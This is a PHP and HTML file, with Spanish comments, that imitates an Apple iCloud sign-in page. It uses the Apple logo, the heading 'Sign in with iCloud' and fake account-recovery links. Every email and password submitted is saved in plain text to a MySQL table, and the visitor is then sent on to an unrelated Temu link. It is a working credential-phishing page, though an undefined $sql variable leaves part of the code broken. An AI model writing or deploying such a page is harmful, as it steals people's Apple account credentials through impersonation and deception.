<?php
// Conexión a la base de datos
$host = "localhost";
$user = "root";
$pass = "";
$db = "registro_icloud";

// Crear conexión
$conn = new mysqli($host, $user, $pass, $db);

// Verificar conexión
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}

// Procesar el formulario
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $correo = $_POST['correo'];
    $contrasena = $_POST['contrasena'];

    // Insertar los datos en la base de datos
    $stmt = $conn->prepare("INSERT INTO usuarios (correo, contrasena) VALUES (?, ?)");
$stmt->bind_param("ss", $correo, $contrasena);
$stmt->execute();
$stmt->close();


    if ($conn->query($sql) === TRUE) {
        // Redirigir al enlace proporcionado
        header("Location: https://www.temu.com/kuiper/dn9.html?...");
        exit();
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Registro iCloud</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f9f9f9;
        }

        .form-container {
            background-color: #ffffff;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 350px;
        }

        /* Manzana y círculo de colores */
        .logo-container {
            position: relative;
            width: 120px;
            height: 120px;
            margin: 0 auto 20px;
        }

        .circle-gradient {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: conic-gradient(
                #FF3B30, #FF9500, #FFCC00, #34C759, #5AC8FA, #007AFF, #5856D6, #FF2D55, #FF3B30
            );
            border-radius: 50%;
            z-index: 1;
        }

        .logo {
            position: absolute;
            top: 25%;
            left: 25%;
            width: 50%;
            height: 50%;
            z-index: 2;
        }

        h1 {
            font-size: 24px;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #d1d1d1;
            border-radius: 6px;
            outline: none;
            font-size: 16px;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #007aff;
            border: none;
            color: white;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #005bb5;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <!-- Contenedor de la manzana con el círculo -->
        <div class="logo-container">
            <div class="circle-gradient"></div>
            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo" class="logo">
        </div>

        <h1>Sign in with iCloud</h1>
        <form method="POST" action="">
            <input type="email" name="correo" placeholder="Correo de iCloud" required>
            <input type="password" name="contrasena" placeholder="Contraseña" required>
            <button type="submit">Registrarse</button>
        </form>

        <a href="#">Forgot Apple ID or password?</a>
        <a href="#">Create Apple ID</a>
    </div>
</body>
</html>
